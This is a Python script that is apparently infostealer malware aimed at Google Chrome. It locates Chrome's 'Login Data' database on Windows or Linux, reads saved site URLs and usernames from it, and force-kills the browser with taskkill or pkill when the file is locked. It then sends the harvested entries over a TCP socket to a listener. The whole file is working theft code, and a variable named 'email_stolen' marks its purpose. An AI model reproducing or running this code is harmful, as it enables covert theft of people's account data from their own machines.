import socket
import sqlite3
import os, subprocess

class SocketConfig:

    def __init__(self, HOST:str, PORT:int) -> None:

        self.HOST = HOST
        self.PORT =  PORT

    def connect(self) -> socket:
        try:
            skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            skt.connect((self.HOST, self.PORT))
            return skt
        except Exception as e:
            print(f'Check connect(): {e}')
        

    def send_data(self, skt_client: socket, email_stolen: list) -> None:

        if skt_client:
            try:
                if not email_stolen:
                    skt_client.sendall("Empty".encode())

                else:
                    for item in email_stolen:
                        skt_client.sendall(item.encode())
            except Exception as e:
                print(f'Check send_data(): {e}')
        

    def close_chrome(self, skt_client: socket):

            if os.name == 'nt':
                data = "taskkill /F /IM chrome.exe".strip()
            elif os.name == 'posix':
                data = "pkill -9 chrome".strip()
            else:
                data = ''

            try:
                process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output, error = process.communicate()
                response = output+error
                skt_client.sendall(response)
            except Exception as e:
                print(f'Erro cmd(): {e}')
        
class DatabaseConfig:
    
    def __init__(self, login_data_path: str, socket_obj: SocketConfig, skt_client: socket.socket) -> None:
        
        self.login_data_path = login_data_path
        self.socket_obj = socket_obj
        self.skt_client = skt_client
        
    def database_connect(self) -> sqlite3.Connection:

        try:
            sqliteConnection = sqlite3.connect(self.login_data_path)
            return sqliteConnection
        except Exception as e:
            print(f'Check database_connect(): {e}')
            return None
        
    def extract_email_data(self, database_conn: sqlite3.Connection):

            try:
                sql_query = "SELECT origin_url,username_value,password_value FROM logins;"
                cursor = database_conn.cursor()
                cursor.execute(sql_query)
                result_query = cursor.fetchall()

                list_users = []
                for data in result_query:
                    if data[1] == '':
                        continue
                    usermail = f"\nHost: {data[0]}\nUser: {data[1]}" 
                    list_users.append(usermail)
                return list_users
            
            except Exception as e:
                print(f'check extract_email_data(): {e}')
                raise

            finally:
                if database_conn:
                    cursor.close()
                    database_conn.close()

    def extract_data(self) -> list:
        
        try:
            database_conn = self.database_connect()
            return self.extract_email_data(database_conn)

        except Exception as e:

            print(f'Check extract_data(): {e}')
            self.socket_obj.close_chrome(self.skt_client)
        
            try:

                database_reconn = self.database_connect()
                return self.extract_email_data(database_reconn)
            
            except Exception as e:
                return []
        
                
if __name__ == "__main__":

    if os.name == 'nt':
        login_data_path = os.path.join(
            os.environ['LOCALAPPDATA'],
            "Google", "Chrome", "User Data", "Default", "Login Data"
        )
    elif os.name == 'posix':
        login_data_path = os.path.expanduser(
            "~/.config/google-chrome/Default/Login Data"
        )
        
    client = SocketConfig('localhost', 9999)
    skt = client.connect()
    
    if skt:
        database = DatabaseConfig(login_data_path, client, skt)
        databaseConnection = database.database_connect()
        dataBaseEmails = database.extract_data()

        client.send_data(skt, dataBaseEmails)
    